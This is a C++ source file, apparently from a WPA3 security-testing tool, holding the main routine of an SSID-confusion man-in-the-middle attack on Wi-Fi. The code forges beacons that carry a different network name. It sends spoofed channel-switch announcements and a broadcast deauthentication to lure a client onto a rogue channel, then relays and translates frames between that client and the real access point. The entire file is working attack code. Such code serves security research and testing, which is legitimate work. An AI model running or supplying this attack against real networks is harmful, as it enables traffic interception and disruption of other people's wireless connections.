#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "interrupt.h"
#include "scan/active/scan_AP.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;
using namespace chrono;

void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
	const string real_ssid = ap.get(SK::ssid);          // "WrongNet"

	rogue_ap->set_iface_up();
    rogue_sta->set_iface_up();

    const HWAddress<6> ap_bssid(ap.get(SK::permanent_mac));
    const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::permanent_mac));
    const HWAddress<6> client_perm(sta.get(SK::permanent_mac));

    // Scan for WrongNet beacon on ch 11 — template for CSA + confused beacon
	setup_real_AP_RSN_frames();

    // Build confused beacon: rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel.
    // Using rogue_ap_mac avoids wpa_supplicant's 10s ignore-list that fires after CSA disconnect.
    beacon = make_confused_beacon(*beacon, confused_ssid, false);
    beacon->addr2(rogue_ap_mac);
    beacon->addr3(rogue_ap_mac);
    if(auto *ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
        const_cast<uint8_t *>(ch_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
    if(auto *ht_ie = beacon->search_option(Dot11ManagementFrame::HT_OPERATION)) {
        if(ht_ie->data_size() >= 1)
            const_cast<uint8_t *>(ht_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
    }
    probe_resp = std::make_unique<Tins::Dot11ProbeResponse>(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));

    // BPF: AP + client traffic only
	const string bpf = "(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) + " or wlan host " +
	sta.get(SK::permanent_mac) + " or wlan host " + rogue_sta.get(SK::permanent_mac) + " or wlan host " +
	rogue_ap.get(SK::permanent_mac) + ")";


	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface), rogue_sta[SK::netns]);
	sock_rogue = make_unique<MonitorSocket>(rogue_ap.get(SK::iface), rogue_ap[SK::netns]);
	sock_real->set_filter(bpf);
	sock_rogue->set_filter(bpf);

	const string nic_client_ack = "client_ack_vif";
	const auto &netns = rogue_sta[SK::netns];
		Dot11Beacon ack_beacon;

	rogue_sta->set_mac_address(sta->get(SK::mac));
	start_ap_hostapd(rs, nic_client_ack, rogue_sta, netconfig.real_channel, client_perm);

    rs.start_observers(ObserverRunPolicy::SKIP);
    rs.process_manager.write_log_all(ATTACK_START_tag);

    // Initial CSA burst: spoof WrongNet MAC, push client ch 11 → ch 1
    for(int pass = 0; pass < 3; ++pass) {
        for(int cnt = CSA_attack::CHANNEL_SWITCH_MAX; cnt >= 0; --cnt) {
            RadioTap csa = CSA_attack::get_CSA_beacon(
                ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, cnt, beacon.get());
            send_to_real(csa);
            interruptible_sleep(milliseconds(beacon_ms));
        }
    }
    // Broadcast deauth so client re-scans
    Dot11Deauthentication deauth(HWAddress<6>::broadcast, HWAddress<6>(ap_bssid));
    deauth.addr3(HWAddress(ap_bssid));
    deauth.reason_code(3);
    send_to_real(deauth);

    const auto start      = steady_clock::now();
    auto next_beacon      = steady_clock::now();
    auto last_real_beacon = steady_clock::now();
    int  csa_count = CSA_attack::CHANNEL_SWITCH_MAX;

    while(true) {
        if(steady_clock::now() > start + seconds(timeout_sec)) {
            log(LogLevel::INFO, "Attack timeout");
            break;
        }
        //if(only_to_mitm && got_mitm) break;

    	const int fd_real = pcap_get_selectable_fd(sock_real->get_pcap_handle());
    	const int fd_rogue = pcap_get_selectable_fd(sock_rogue->get_pcap_handle());

    	fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(fd_real, &read_fds);
        FD_SET(fd_rogue, &read_fds);
        const auto us_to_beacon = duration_cast<microseconds>(next_beacon - steady_clock::now()).count();
        timeval tv{ 0, (max<long>(0, min<long>(us_to_beacon, 100'000))) };
        select(max(fd_real, fd_rogue) + 1, &read_fds, nullptr, nullptr, &tv);

    	// ch 11: frames from WrongNet AP → relay to client on ch 1 (translate BSSID)
    	if(FD_ISSET(fd_real, &read_fds)) {
    		while(auto recv_res = sock_real->recv()) handle_rx_real_chan(recv_res.pdu, recv_res.raw);
    	}
    	// ch 1: frames from confused client → relay to WrongNet on ch 11 (translate BSSID back)
    	if(FD_ISSET(fd_rogue, &read_fds)) {
    		while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
    	}

		if(next_beacon <= steady_clock::now()) {
            send_to_rogue(*beacon);
            RadioTap csa = CSA_attack::get_CSA_beacon(ap.get(SK::mac),
            	netconfig.real_channel, netconfig.rogue_channel,
            	csa_count, beacon.get());
                send_to_real(csa);
                if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
            next_beacon += milliseconds(beacon_ms);
        }

        /*if(last_real_beacon + seconds(beacon_warn_sec) < steady_clock::now()) {
            log(LogLevel::WARNING, "No beacon from WrongNet AP for {}s", beacon_warn_sec);
            last_real_beacon = steady_clock::now();
        }*/
    }
    rs.process_manager.write_log_all(ATTACK_STOP_tag);
	hw_capabilities::run_cmd({ "iw", "dev", nic_client_ack, "del" }, netns, true);

}

}